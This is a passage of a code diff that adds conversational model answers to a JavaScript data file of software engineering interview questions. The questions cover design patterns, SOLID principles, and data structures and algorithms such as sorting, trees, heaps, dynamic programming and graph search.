+        a: `<div class="interview-answer"><p>Decorator wraps an object in another object that shares its interface and adds behavior, letting you compose features at runtime instead of exploding the class hierarchy with a subclass per combination. The canonical example is Java's I/O streams — a <code>BufferedInputStream</code> wrapping a <code>FileInputStream</code> — and it's the clean alternative to inheritance when you'd otherwise need a BufferedEncryptedCompressedStream-style explosion. Because each decorator is small and single-purpose it's very Single-Responsibility and Open/Closed friendly. Versus Proxy (same interface, controls access) and Adapter (changes the interface), Decorator keeps the interface and enriches behavior. The gotchas are deep wrapping chains that are hard to debug and identity checks breaking because the object isn't the raw type anymore.</p></div>
+<p><strong>Decorator</strong> adds behavior to an object without changing its class.</p>
 <pre>interface Coffee {
     String description();
     int cost();
@@ -2602,7 +2694,8 @@ class MilkDecorator implements Coffee {
       {
         q: 'What is the Template Method pattern?',
         difficulty: 'medium',
-        a: `<p><strong>Template Method</strong> defines the skeleton of an algorithm in a base class while subclasses customize steps.</p>
+        a: `<div class="interview-answer"><p>Template Method fixes the skeleton of an algorithm in a base class and lets subclasses fill in specific steps via overridable hooks — the overall sequence stays put, only the varying steps change. It's the classic "don't call us, we'll call you" inversion, great for frameworks: a base test runner's setup/run/teardown, or a data pipeline where only the parse or transform step differs. The value is factoring out duplicated structure while letting the pieces vary. The tradeoff, and it's a big one for a senior, is that it's inheritance-based, so it carries inheritance's coupling and fragile-base-class risks — often Strategy (composition, inject the varying step) is the more flexible modern choice for the same goal.</p></div>
+<p><strong>Template Method</strong> defines the skeleton of an algorithm in a base class while subclasses customize steps.</p>
 <pre>abstract class FileProcessor {
     public final void process() {
         read();
@@ -2627,7 +2720,8 @@ class CsvProcessor extends FileProcessor {
       {
         q: 'What is the Chain of Responsibility pattern?',
         difficulty: 'hard',
-        a: `<p><strong>Chain of Responsibility</strong> passes a request through a chain of handlers until one handles it or the chain ends.</p>
+        a: `<div class="interview-answer"><p>Chain of Responsibility passes a request along a line of handlers, each deciding to handle it or pass it on, so the sender is decoupled from whoever ultimately handles it and you can reconfigure the chain freely. The everyday example everyone actually uses is middleware — Express, servlet filters, HTTP interceptor pipelines — where auth, logging, and validation are links in a chain. It shines when the set or order of processing steps should be flexible and each step is independent. The gotchas: a request can fall off the end unhandled, so you need a default or explicit termination, and long chains hurt debuggability and performance since every link is touched. It's the pattern behind most request-processing pipelines.</p></div>
+<p><strong>Chain of Responsibility</strong> passes a request through a chain of handlers until one handles it or the chain ends.</p>
 <pre>abstract class Handler {
     private Handler next;
 
@@ -2660,7 +2754,8 @@ class AuditHandler extends Handler {
       {
         q: 'What is the Repository pattern?',
         difficulty: 'medium',
-        a: `<p><strong>Repository</strong> abstracts data access behind a collection-like interface, decoupling business logic from persistence details.</p>
+        a: `<div class="interview-answer"><p>Repository puts a collection-like interface in front of persistence, so your domain talks to something like <code>orders.findById()</code> instead of SQL or an ORM directly — that decouples the domain from storage and gives you a clean seam to mock in tests. The honest caveat is that it's frequently over-applied: if you're wrapping a mature ORM like EF or JPA that already implements this pattern, a thin passthrough repository is often redundant ceremony. It earns its keep when you have real domain logic to protect, multiple data sources, or you're doing DDD with aggregates. The classic anti-pattern is a generic <code>Repository&lt;T&gt;</code> with a giant leaky query API that just re-exposes the ORM — at that point it's abstraction theater.</p></div>
+<p><strong>Repository</strong> abstracts data access behind a collection-like interface, decoupling business logic from persistence details.</p>
 <pre>// Without Repository: business logic knows about JPA
 entityManager.createQuery("SELECT u FROM User u WHERE u.email = :email")
     .setParameter("email", email)
@@ -2701,7 +2796,8 @@ class UserService {
       {
         q: 'What is Dependency Injection and how does it relate to design patterns?',
         difficulty: 'medium',
-        a: `<p><strong>Dependency Injection (DI)</strong> provides dependencies from outside rather than creating them inside, enabling loose coupling and testability.</p>
+        a: `<div class="interview-answer"><p>DI just means a class receives its dependencies from outside — usually via the constructor — instead of building them itself with <code>new</code>. That inversion is what makes code loosely coupled and testable: you can inject a mock or a different implementation without touching the class. It's the concrete mechanism behind the Dependency Inversion principle (depend on abstractions, not concretions) and is closely tied to Inversion of Control and the Strategy pattern. I strongly prefer constructor injection over field or setter injection because it makes dependencies explicit and lets you build immutable, fully-initialized objects. And DI is a technique you can do by hand — a container is convenience, not a requirement, and over-configured containers with magic autowiring are their own maintainability trap.</p></div>
+<p><strong>Dependency Injection (DI)</strong> provides dependencies from outside rather than creating them inside, enabling loose coupling and testability.</p>
 <pre>// ❌ Without DI: tight coupling
 class OrderService {
     private EmailService emailService = new EmailService(); // hardcoded dependency
@@ -2733,7 +2829,8 @@ class OrderService {
       {
         q: 'What are SOLID principles? Give a brief example of each.',
         difficulty: 'hard',
-        a: `<p>SOLID is five object-oriented design principles that make code more maintainable:</p>
+        a: `<div class="interview-answer"><p>SOLID is five principles for managing change and coupling. SRP — a class should have one reason to change, so keep responsibilities cohesive. OCP — open for extension, closed for modification, add behavior via new code rather than editing tested code. LSP — subtypes must be substitutable for their base without breaking callers (the square/rectangle trap). ISP — many small focused interfaces beat one fat one, so clients don't depend on methods they don't use. DIP — depend on abstractions, not concretions, which is what DI enables. The senior framing is that these are heuristics serving one goal, isolating change, not laws — dogmatically maximizing them gives you a swamp of tiny interfaces and indirection, so apply them where change actually happens.</p></div>
+<p>SOLID is five object-oriented design principles that make code more maintainable:</p>
 <pre>S - Single Responsibility: One class = one reason to change
   ❌ UserService handles login, email sending, and PDF generation
   ✅ UserService handles login; EmailService handles email; PdfService handles PDF
@@ -2760,7 +2857,8 @@ D - Dependency Inversion: Depend on abstractions, not concretions
       {
         q: 'What is the difference between Adapter, Facade, and Proxy patterns?',
         difficulty: 'tricky',
-        a: `<p>All three wrap another object, but for <strong>different reasons</strong>:</p>
+        a: `<div class="interview-answer"><p>All three are structural wrappers, and the distinction is purely intent. Adapter changes the interface — it makes an incompatible class fit the interface your client expects, glue for integration. Facade simplifies — it puts one easy interface over a whole complex subsystem to reduce coupling, fronting many objects. Proxy preserves the interface exactly and controls access — lazy loading, caching, access control, remoting — and the client shouldn't even know it's there. The quick test: different interface is Adapter, a simpler interface over many things is Facade, same interface with a gatekeeper is Proxy. And Decorator is the fourth cousin — same interface, but adding behavior rather than controlling access.</p></div>
+<p>All three wrap another object, but for <strong>different reasons</strong>:</p>
 <table><tr><th>Pattern</th><th>Purpose</th><th>Interface</th><th>Example</th></tr>
 <tr><td><strong>Adapter</strong></td><td>Convert incompatible interface</td><td>Changes interface</td><td>Legacy API → new interface</td></tr>
 <tr><td><strong>Facade</strong></td><td>Simplify complex subsystem</td><td>New simplified interface</td><td>checkout() wraps 5 services</td></tr>
@@ -2793,7 +2891,8 @@ class CachingUserProxy implements UserService {
       {
         q: 'Why is double-checked locking broken without volatile?',
         difficulty: 'tricky',
-        a: `<p>The classic Java singleton trap. Double-checked locking tries to avoid synchronizing on every <code>getInstance()</code> call — but without <code>volatile</code> it can return a <strong>half-constructed object</strong>.</p>
+        a: `<div class="interview-answer"><p>This is a memory-model bug, not a logic bug. The idea is to check the instance, synchronize only if null, then check again — avoiding a lock on the hot path. The trap is that <code>instance = new Singleton()</code> isn't atomic: the JVM can allocate memory and publish the reference before the constructor finishes, so another thread sees a non-null but half-initialized object. <code>volatile</code> fixes it by inserting the happens-before memory barrier that prevents that reordering and guarantees visibility. Without it the code looks correct, passes tests, then fails rarely under load — the worst kind of bug. Honestly, in Java I'd sidestep the whole thing with the initialization-on-demand holder idiom or an enum, which are lazy and thread-safe for free.</p></div>
+<p>The classic Java singleton trap. Double-checked locking tries to avoid synchronizing on every <code>getInstance()</code> call — but without <code>volatile</code> it can return a <strong>half-constructed object</strong>.</p>
 <pre>// BROKEN without volatile:
 class Singleton {
     private static Singleton instance;   // ← missing volatile!
@@ -2843,7 +2942,8 @@ enum Singleton {
       {
         q: 'Why favor composition over inheritance?',
         difficulty: 'hard',
-        a: `<p>Inheritance couples your class to the <strong>implementation details</strong> of the parent — the "fragile base class" problem. The canonical demonstration is <code>InstrumentedHashSet</code> from <em>Effective Java</em>:</p>
+        a: `<div class="interview-answer"><p>The core reason is that inheritance is the tightest coupling there is — a subclass depends on the parent's implementation details, not just its interface, so a base-class change can silently break subclasses (the fragile base class problem). The <code>InstrumentedHashSet</code> example shows it: overriding one method breaks because the parent calls its own methods internally. Composition — holding an object and delegating — depends only on the collaborator's public interface, so it's more robust and flexible at runtime, where inheritance is fixed at compile time. My rule is to inherit only for a genuine "is-a" with a stable base designed for extension, and otherwise favor "has-a." It's Effective Java Item 18, and it's also why Strategy and Decorator exist.</p></div>
+<p>Inheritance couples your class to the <strong>implementation details</strong> of the parent — the "fragile base class" problem. The canonical demonstration is <code>InstrumentedHashSet</code> from <em>Effective Java</em>:</p>
 <pre>// BROKEN: inheritance leaks the parent's self-calls
 class InstrumentedHashSet&lt;E&gt; extends HashSet&lt;E&gt; {
     private int addCount = 0;
@@ -2893,7 +2993,8 @@ class InstrumentedSet&lt;E&gt; implements Set&lt;E&gt; {
       {
         q: 'What is the Anemic Domain Model anti-pattern?',
         difficulty: 'hard',
-        a: `<p>An <strong>Anemic Domain Model</strong> (named by Martin Fowler) is when your "domain objects" are just getter/setter bags with zero behavior, and ALL business logic lives in service classes. It looks object-oriented but is procedural code wearing an OO costume.</p>
+        a: `<div class="interview-answer"><p>Anemic domain model is when your domain objects are just data bags — getters and setters, no behavior — and all the logic lives in service classes operating on them. Fowler flagged it as an anti-pattern because it looks object-oriented but is procedural: it breaks encapsulation by exposing all state and scatters the rules that protect that state across services, so invariants aren't guarded at the source. The fix is to push behavior back onto the entities — a rich model where an <code>Order</code> knows how to <code>cancel()</code> itself and enforces its own invariants. The nuance I'd say out loud: anemic is genuinely fine for simple CRUD; it only bites when there's real domain complexity, which is exactly where DDD pushes back.</p></div>
+<p>An <strong>Anemic Domain Model</strong> (named by Martin Fowler) is when your "domain objects" are just getter/setter bags with zero behavior, and ALL business logic lives in service classes. It looks object-oriented but is procedural code wearing an OO costume.</p>
 <pre>// ANEMIC: the entity knows nothing, the service knows everything
 class Order {                       // just a data bag
     private String status;
@@ -2943,7 +3044,8 @@ class Order {
       {
         q: 'When should you NOT use a design pattern?',
         difficulty: 'tricky',
-        a: `<p>A favorite senior filter-question. The wrong answer is a blank stare; the right answer is that <strong>patterns are vocabulary, not goals</strong> — each one buys flexibility by adding indirection, and indirection has a permanent readability cost.</p>
+        a: `<div class="interview-answer"><p>The right answer is that patterns are vocabulary, not goals — every one buys flexibility by adding indirection, and indirection has a permanent readability and maintenance cost. So you don't use one until the force it addresses actually shows up: no Strategy for the one algorithm you'll ever have, no factory "in case" the type changes, no abstraction for a single implementation (YAGNI). Speculative generality — pattern-itis — is a real code smell that makes simple code hard to follow. My rule is to write the simplest thing that works and refactor toward a pattern when duplication or a second variation forces it. The maturity signal is choosing NOT to, and being able to name the cost you're avoiding.</p></div>
+<p>A favorite senior filter-question. The wrong answer is a blank stare; the right answer is that <strong>patterns are vocabulary, not goals</strong> — each one buys flexibility by adding indirection, and indirection has a permanent readability cost.</p>
 <pre>// Resume-driven design: a Strategy/Factory layer-cake...
 interface DiscountStrategy { BigDecimal apply(BigDecimal price); }
 class RegularDiscountStrategy implements DiscountStrategy { ... }
@@ -2981,7 +3083,8 @@ BigDecimal discount(CustomerType type, BigDecimal price) {
       {
         q: 'What is a God Object, and what does the Law of Demeter say about train wrecks?',
         difficulty: 'hard',
-        a: `<p>Two related coupling smells that interviewers probe together.</p>
+        a: `<div class="interview-answer"><p>A God Object is a class that knows and does too much — it centralizes responsibilities that should be spread out, so everything depends on it, it can't be tested in isolation, and every change touches it. It's the ultimate SRP violation and usually grows by accretion. The Law of Demeter — "only talk to your immediate friends" — targets the related smell: train wrecks like <code>order.getCustomer().getAddress().getCity()</code>, where reaching through a chain couples you to the whole object graph's structure, so a change deep in that chain ripples out. The fix for both is "tell, don't ask": give objects behavior instead of pulling their guts out, and delegate. The caveat is that data structures and fluent builders legitimately chain, so LoD isn't an absolute rule about dots.</p></div>
+<p>Two related coupling smells that interviewers probe together.</p>
 <p><strong>God Object</strong>: one class that knows too much and does too much — <code>AppManager</code>, <code>Utils</code>, a 4000-line <code>OrderService</code> touching pricing, inventory, email, and PDF generation. Every change routes through it, so it has maximal merge conflicts, untestable constructor dependencies, and no single reason to change (violates SRP by definition).</p>
 <p><strong>Law of Demeter</strong> ("only talk to your immediate friends"): a method should call methods on its own fields, its parameters, and objects it creates — not on objects <em>returned by</em> those objects. Violations look like train wrecks:</p>
 <pre>// Train wreck — coupled to the STRUCTURE of three objects:
@@ -3025,7 +3128,8 @@ class Wallet {
       {
         q: 'What is Big O Notation and why does it matter?',
         difficulty: 'easy',
-        a: `<p><strong>Big O Notation</strong> describes how the runtime or memory of an algorithm grows as the input size grows. It answers: <em>"If I double my data, how much slower does it get?"</em></p>
+        a: `<div class="interview-answer"><p>Big O describes how cost grows as input grows — it's about asymptotic scaling, not wall-clock time, so it deliberately drops constants and lower-order terms. In practice I care about knowing the ladder (O(1), log n, n, n log n, n², 2ⁿ) and where my algorithm sits, and remembering it's worst-case unless stated — average and amortized often matter more, since a hash map is O(1) average but O(n) worst, and a dynamic-array push is amortized O(1). The senior nuance is that because Big O ignores constants, for small n a "worse" algorithm can win, and cache locality or a huge constant factor can make an O(n) beat an O(log n) in reality. It's a tool for reasoning about scale, not a substitute for measuring.</p></div>
+<p><strong>Big O Notation</strong> describes how the runtime or memory of an algorithm grows as the input size grows. It answers: <em>"If I double my data, how much slower does it get?"</em></p>
 <p><strong>Analogy:</strong> You're looking for a friend in a crowd.</p>
 <ul>
 <li><strong>O(1)</strong>: Your friend is always at the front door. Crowd size doesn't matter → <strong>constant</strong>.</li>
@@ -3047,7 +3151,8 @@ Example with n = 1,000,000:
       {
         q: 'What is an Array vs a Linked List? When to use which?',
         difficulty: 'easy',
-        a: `<p><strong>Array</strong>: Elements stored in <strong>contiguous</strong> (side-by-side) memory. Access by index is instant.</p>
+        a: `<div class="interview-answer"><p>Arrays are contiguous memory — O(1) random access by index and, just as important, cache-friendly, which in practice makes them faster than the Big O suggests. Linked lists give O(1) insert or delete once you hold the node, and no resizing, but every access is a pointer chase with O(n) traversal and poor cache locality. So the honest real-world take is that I default to dynamic arrays (ArrayList, vector) for almost everything, because contiguous memory beats pointer-chasing on modern CPUs even for many mid-list operations. Linked lists earn their place for O(1) splicing, implementing queues and deques, or when you already hold the node reference, like an LRU cache. The classic gotcha is assuming linked-list insertion is cheap when finding the position is still O(n).</p></div>
+<p><strong>Array</strong>: Elements stored in <strong>contiguous</strong> (side-by-side) memory. Access by index is instant.</p>
 <p><strong>Linked List</strong>: Elements (nodes) stored anywhere in memory, each pointing to the next one.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -3070,7 +3175,8 @@ Linked List: [10]→[20]→[30]→[40]→[50]→null
       {
         q: 'What is a Stack and a Queue?',
         difficulty: 'easy',
-        a: `<p><strong>Stack</strong> = Last In, First Out (LIFO). Like a stack of plates — you add and remove from the top.</p>
+        a: `<div class="interview-answer"><p>Stack is LIFO, queue is FIFO — both restrict access to make intent clear and keep operations O(1). Stacks show up everywhere I actually work: the call stack, undo/redo, expression parsing and bracket matching, backtracking, and iterative DFS. Queues are for order-preserving processing — BFS, task scheduling, buffering, producer-consumer. I'd mention the useful variants: a deque (double-ended, the Swiss-army knife you can use as either), a priority queue (a heap, not really FIFO), and a circular buffer for fixed-size streams. The implementation note: back both with a dynamic array or linked list, and in Java specifically prefer <code>ArrayDeque</code> over the legacy <code>Stack</code> class.</p></div>
+<p><strong>Stack</strong> = Last In, First Out (LIFO). Like a stack of plates — you add and remove from the top.</p>
 <p><strong>Queue</strong> = First In, First Out (FIFO). Like a line at a coffee shop — first person in line is served first.</p>
 <pre>Stack (LIFO):             Queue (FIFO):
   push(1) → [1]            enqueue(1) → [1]
@@ -3097,7 +3203,8 @@ Input: "({[]})"
       {
         q: 'What is a Hash Map (Hash Table) and how does it work?',
         difficulty: 'easy',
-        a: `<p>A <strong>Hash Map</strong> stores key-value pairs and provides <strong>O(1)</strong> average lookup, insert, and delete.</p>
+        a: `<div class="interview-answer"><p>A hash map gives O(1) average lookup by hashing the key to a bucket index; the interesting part is everything around collisions. Collisions are inevitable, so you resolve them with chaining (a list or tree per bucket) or open addressing, and to keep O(1) you resize and rehash once the load factor gets high — that resize is why it's amortized, not guaranteed, O(1). Worst case degrades to O(n) with bad hashing or adversarial collisions, which is a real DoS vector; Java 8 mitigates it by turning long chains into balanced trees for O(log n) per bucket. The gotchas I'd flag: a correct hashCode/equals contract is mandatory, and never mutate a key after insertion or you lose it.</p></div>
+<p>A <strong>Hash Map</strong> stores key-value pairs and provides <strong>O(1)</strong> average lookup, insert, and delete.</p>
 <p><strong>Analogy:</strong> A library filing system. Each book (value) has a unique call number (key). The librarian uses a formula (hash function) to calculate exactly which shelf to go to — no need to search every shelf.</p>
 <pre>How it works:
 1. hash("apple") → 3    (hash function converts key to array index)
@@ -3125,7 +3232,8 @@ prices.containsKey("apple"); // O(1) → true</pre>
       {
         q: 'What is Binary Search and when can you use it?',
         difficulty: 'easy',
-        a: `<p><strong>Binary Search</strong> finds a target in a <strong>sorted</strong> array by repeatedly cutting the search space in half. It's O(log n) — extremely fast.</p>
+        a: `<div class="interview-answer"><p>Binary search halves the search space each step for O(log n), but it has one hard precondition: the data must be sorted, or otherwise monotonic. I emphasize monotonicity because binary search is far more general than "find in a sorted array" — the real senior insight is binary search on the answer, where you search over a range of possible answers as long as feasibility is monotonic. The implementation is deceptively bug-prone: the classic mistakes are integer overflow in <code>mid = (lo + hi) / 2</code> — use <code>lo + (hi - lo) / 2</code> — and off-by-one or infinite loops from sloppy boundary updates. I keep the loop invariant explicit and decide half-open vs closed intervals up front.</p></div>
+<p><strong>Binary Search</strong> finds a target in a <strong>sorted</strong> array by repeatedly cutting the search space in half. It's O(log n) — extremely fast.</p>
 <p><strong>Analogy:</strong> Guessing a number between 1-100. Instead of guessing 1, 2, 3... you say "50?" → "Too high" → "25?" → "Too low" → "37?" Each guess eliminates half the numbers.</p>
 <pre>Find 23 in [2, 5, 8, 12, 16, 23, 38, 56, 72, 91]:
 
@@ -3155,7 +3263,8 @@ int binarySearch(int[] arr, int target) {
       {
         q: 'Explain Bubble Sort, Selection Sort, and Insertion Sort.',
         difficulty: 'easy',
-        a: `<p>These are three simple sorting algorithms, all O(n²). Great for learning but too slow for large data.</p>
+        a: `<div class="interview-answer"><p>All three are O(n²) and I'd never ship them for large data, but the distinctions still matter. Insertion sort is the one that earns real use: it's O(n) on nearly-sorted data, stable, in-place, and low-overhead, which is exactly why production sorts like Timsort and introsort switch to it for small subarrays. Selection sort minimizes the number of swaps — useful when writes are expensive — but is never adaptive. Bubble sort is basically a teaching tool whose only redeeming trait is detecting already-sorted input in one pass. The point I'd make is that constant factors and adaptivity matter at small n, which is why the "bad" O(n²) insertion sort beats the "good" O(n log n) sorts for tiny inputs.</p></div>
+<p>These are three simple sorting algorithms, all O(n²). Great for learning but too slow for large data.</p>
 <p><strong>1. Bubble Sort</strong> — Repeatedly swap adjacent elements if they're in the wrong order. Like bubbles rising to the surface.</p>
 <pre>[5, 3, 8, 1] → compare pairs and swap:
   5,3 → swap → [3, 5, 8, 1]
@@ -3181,7 +3290,8 @@ int binarySearch(int[] arr, int target) {
       {
         q: 'Explain Merge Sort. How does it work?',
         difficulty: 'medium',
-        a: `<p><strong>Merge Sort</strong> uses <strong>Divide and Conquer</strong>: split the array in half, sort each half, then merge the two sorted halves. Always O(n log n).</p>
+        a: `<div class="interview-answer"><p>Merge sort is divide-and-conquer: recursively split, then merge sorted halves — and its selling points are a guaranteed O(n log n) worst case with no bad-pivot risk, plus stability. The cost is O(n) extra space for the merge, its main downside versus quicksort. Where it genuinely wins: it's stable (so it's Java's sort for objects), it's the natural fit for linked lists with no random access needed, and it's the basis for external sorting when data doesn't fit in RAM — you merge sorted runs from disk. So when an interviewer says "sort a 100GB file," merge sort is the answer. The summary I give: merge sort when you need stability or worst-case guarantees, quicksort when you want in-place speed on average.</p></div>
+<p><strong>Merge Sort</strong> uses <strong>Divide and Conquer</strong>: split the array in half, sort each half, then merge the two sorted halves. Always O(n log n).</p>
 <p><strong>Analogy:</strong> Sorting a deck of cards. Split the deck in half. Split each half again. Keep splitting until you have single cards (already sorted). Then merge pairs of sorted piles by comparing their top cards.</p>
 <pre>Merge Sort [38, 27, 43, 3, 9, 82, 10]:
 
@@ -3215,7 +3325,8 @@ void mergeSort(int[] arr, int left, int right) {
       {
         q: 'Explain Quick Sort. How does it work?',
         difficulty: 'medium',
-        a: `<p><strong>Quick Sort</strong> picks a "pivot" element, partitions the array so everything smaller goes left and everything larger goes right, then recursively sorts left and right.</p>
+        a: `<div class="interview-answer"><p>Quicksort partitions around a pivot and recurses — O(n log n) average, in-place, with excellent cache locality, which is why it's usually the fastest general-purpose sort in practice. The catch is the O(n²) worst case when pivots are consistently bad (already-sorted input with a naive first/last pivot) and that it isn't stable. The mitigations a senior should name: randomized or median-of-three pivot selection to make the worst case improbable, and introsort — what most standard libraries actually use — which starts with quicksort and bails to heapsort if recursion gets too deep, guaranteeing O(n log n). I'd also mention three-way partitioning (Dutch national flag) to handle many duplicate keys efficiently.</p></div>
+<p><strong>Quick Sort</strong> picks a "pivot" element, partitions the array so everything smaller goes left and everything larger goes right, then recursively sorts left and right.</p>
 <p><strong>Analogy:</strong> Organizing books on a shelf. Pick one book (pivot). Put all shorter books to the left, taller books to the right. Then do the same for each side.</p>
 <pre>Quick Sort [8, 3, 1, 7, 0, 10, 2]:
   Pivot = 7
@@ -3256,7 +3367,8 @@ int partition(int[] arr, int low, int high) {
       {
         q: 'What is a Binary Tree and a Binary Search Tree (BST)?',
         difficulty: 'easy',
-        a: `<p><strong>Binary Tree</strong>: Each node has at most 2 children (left and right).</p>
+        a: `<div class="interview-answer"><p>A binary tree is just nodes with up to two children; a BST adds the ordering invariant — left subtree smaller, right subtree larger — which gives O(log n) search, insert, and delete. The crucial caveat I always raise is that O(log n) only holds if the tree is balanced: insert sorted data into a naive BST and it degenerates into a linked list, O(n). That's the whole reason self-balancing trees exist — red-black trees (what most TreeMaps use) and AVL trees rebalance on mutation to keep height logarithmic. An in-order traversal of a BST yields sorted order, a handy property. So in real code I reach for a balanced BST via the standard library's ordered map, never a hand-rolled plain BST.</p></div>
+<p><strong>Binary Tree</strong>: Each node has at most 2 children (left and right).</p>
 <p><strong>Binary Search Tree (BST)</strong>: A binary tree where left child < parent < right child. This ordering makes searching fast.</p>
 <p><strong>Analogy:</strong> A BST is like a "20 Questions" game. "Is the number > 50?" → No → "Is it > 25?" → Yes → "Is it > 37?" Each question eliminates half the possibilities.</p>
 <pre>BST Example:
@@ -3290,7 +3402,8 @@ TreeNode insert(TreeNode root, int val) {
       {
         q: 'What are tree traversals: Inorder, Preorder, Postorder, and Level-order?',
         difficulty: 'medium',
-        a: `<p>Tree traversals are ways to visit every node in a tree. The order you visit determines the traversal type.</p>
+        a: `<div class="interview-answer"><p>The three depth-first orders differ only by when you visit the node relative to its children: pre-order (node, left, right) is good for copying or serializing a tree; in-order (left, node, right) on a BST gives sorted output — that's the one to remember; post-order (left, right, node) processes children first, so it's for deletion or evaluating expression trees where you need results from below. Level-order is the breadth-first one — visit by depth using a queue — for shortest-path-by-edges or printing level by level. I'd note they're naturally recursive but can be done iteratively with an explicit stack, or Morris traversal for O(1) space, which matters when the tree is deep enough to blow the call stack.</p></div>
+<p>Tree traversals are ways to visit every node in a tree. The order you visit determines the traversal type.</p>
 <pre>Example tree:
         1
        / \\
@@ -3333,7 +3446,8 @@ void levelOrder(TreeNode root) {
       {
         q: 'What is a Heap (Priority Queue) and how does it work?',
         difficulty: 'medium',
-        a: `<p>A <strong>Heap</strong> is a complete binary tree where the parent is always greater (Max-Heap) or smaller (Min-Heap) than its children. It gives you the min/max element in O(1).</p>
+        a: `<div class="interview-answer"><p>A heap is a complete binary tree with the heap property — parent greater than or equal to (or less than or equal to) its children — giving O(1) peek at the min or max and O(log n) insert and extract. The elegant part is it's stored in a flat array using index arithmetic (children at 2i+1 and 2i+2), so no pointers. It's the go-to whenever you repeatedly need the current extreme: priority queues, Dijkstra, task scheduling, and top-K or streaming-median problems. The key distinction to state is that a heap is only partially ordered, so it's great for min/max but useless for search or sorted iteration — don't reach for it when you need ordering. Heapsort falls out of it, and building a heap from an array is O(n), not O(n log n), which surprises people.</p></div>
+<p>A <strong>Heap</strong> is a complete binary tree where the parent is always greater (Max-Heap) or smaller (Min-Heap) than its children. It gives you the min/max element in O(1).</p>
 <p><strong>Analogy:</strong> A company hierarchy. In a Min-Heap, the CEO (smallest number) is always at the top. New employees (inserts) start at the bottom and "bubble up" if they outrank their manager.</p>
 <pre>Min-Heap:
         1
@@ -3370,7 +3484,8 @@ PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;(Collections.rev
       {
         q: 'What is Recursion? Explain with examples.',
         difficulty: 'easy',
-        a: `<p><strong>Recursion</strong> = a function that calls itself to solve smaller versions of the same problem until it reaches a base case.</p>
+        a: `<div class="interview-answer"><p>Recursion solves a problem by reducing it to smaller instances until a base case — and the two things I check first are that there's a correct base case and that every call moves strictly toward it, or you get infinite recursion and a stack overflow. Its real strength is expressing naturally recursive structures cleanly: trees, graphs, divide-and-conquer, backtracking. The tradeoffs to name: each call costs a stack frame, so deep recursion risks overflow (an explicit stack or iteration is the fix), and naive recursion can recompute overlapping subproblems exponentially — exactly what memoization and DP fix. Tail-call optimization helps in languages that support it, but the JVM notably doesn't, so I don't rely on it in Java.</p></div>
+<p><strong>Recursion</strong> = a function that calls itself to solve smaller versions of the same problem until it reaches a base case.</p>
 <p><strong>Analogy:</strong> Russian nesting dolls (Matryoshka). Open a doll → there's a smaller doll inside. Keep opening until you reach the tiniest doll (base case). Then put them all back together.</p>
 <pre>// Factorial: 5! = 5 × 4 × 3 × 2 × 1
 int factorial(int n) {
@@ -3401,7 +3516,8 @@ int fib(int n) {
       {
         q: 'What is Dynamic Programming (DP)?',
         difficulty: 'hard',
-        a: `<p><strong>Dynamic Programming</strong> = solving complex problems by breaking them into overlapping subproblems and storing results to avoid recomputing them.</p>
+        a: `<div class="interview-answer"><p>DP applies when a problem has two properties: optimal substructure (the optimal answer is built from optimal sub-answers) and overlapping subproblems (the same sub-answers recur), so you compute each once and reuse it, turning exponential into polynomial. My approach is always to nail the recurrence and the state definition first — that's ninety percent of the work — then decide top-down memoization (recursion plus a cache, easy to write, computes only needed states) versus bottom-up tabulation (iterative, no recursion overhead, often lets you optimize space). The senior move is space optimization: many DPs only need the last row or two, dropping O(n²) space to O(n). The hard part in an interview isn't the code, it's recognizing it's DP and defining the state cleanly — I check whether greedy fails first.</p></div>
+<p><strong>Dynamic Programming</strong> = solving complex problems by breaking them into overlapping subproblems and storing results to avoid recomputing them.</p>
 <p><strong>Analogy:</strong> Imagine calculating "1+1+1+1+1+1+1+1". That's 8. Now add "+1". You don't start over! You remember the previous result (8) and just add 1 = 9. That's DP — <strong>remembering answers</strong>.</p>
 <p><strong>Two approaches:</strong></p>
 <pre>1. Top-Down (Memoization): Start from big problem, store results as you go
@@ -3441,7 +3557,8 @@ int fib(int n) {
       {
         q: 'Explain BFS (Breadth-First Search) and DFS (Depth-First Search).',
         difficulty: 'medium',
-        a: `<p>BFS and DFS are two ways to visit all nodes in a graph or tree.</p>
+        a: `<div class="interview-answer"><p>Both explore a graph, and the choice comes down to what you're after. BFS explores level by level using a queue, so it finds the shortest path in an unweighted graph — that's its killer feature — at the cost of O(width) memory. DFS goes deep using a stack or recursion, uses O(depth) memory, and is the natural fit for exhausting paths, detecting cycles, topological sort, and connected components. My rule: shortest-path-by-edges or "nearest" is BFS; exhaustive exploration, path existence, or structural questions is DFS. Both are O(V+E). The gotchas are remembering to mark visited nodes or you loop forever on cycles, and that DFS recursion can overflow the stack on deep graphs, so go iterative when depth is large.</p></div>
+<p>BFS and DFS are two ways to visit all nodes in a graph or tree.</p>
 <p><strong>Analogy — Searching for keys in a house:</strong></p>
 <ul>
 <li><strong>BFS</strong>: Check every room on floor 1 first, then every room on floor 2, etc. (level by level)</li>
@@ -3490,7 +3607,8 @@ void dfs(int node, Set&lt;Integer&gt; visited) {
       {
         q: 'What is the Two Pointer technique?',
         difficulty: 'medium',
-        a: `<p><strong>Two Pointers</strong> = use two indices that move through an array, usually from both ends or at different speeds, to solve problems in O(n).</p>
+        a: `<div class="interview-answer"><p>Two pointers collapses an O(n²) brute force into O(n) by walking two indices instead of nesting loops. Two common shapes: opposite ends converging (find a pair summing to a target in a sorted array, or palindrome checks) and fast/slow same-direction (cycle detection, or the read/write pointer pattern for in-place dedup and partitioning). The precondition for the converging variant is usually a sorted array, which is the cue to reach for it. It's the go-to when a naive solution compares all pairs but the structure lets you eliminate half the possibilities each step. Its close cousin is the sliding window — two pointers moving the same direction to maintain a range.</p></div>
+<p><strong>Two Pointers</strong> = use two indices that move through an array, usually from both ends or at different speeds, to solve problems in O(n).</p>
 <p><strong>Analogy:</strong> Two people searching a hallway of lockers — one starts from the left, one from the right. They walk toward each other and meet in the middle.</p>
 <p><strong>Example 1: Two Sum (sorted array)</strong></p>
 <pre>Find two numbers that add to 9 in [1, 2, 4, 6, 8, 10]:
@@ -3521,7 +3639,8 @@ Result: first 3 elements = [1, 2, 3] ✅</pre>
       {
         q: 'What is the Sliding Window technique?',
         difficulty: 'medium',
-        a: `<p><strong>Sliding Window</strong> = maintain a "window" (subarray/substring) that expands or shrinks as you move through the array. Avoids recomputing from scratch each time.</p>
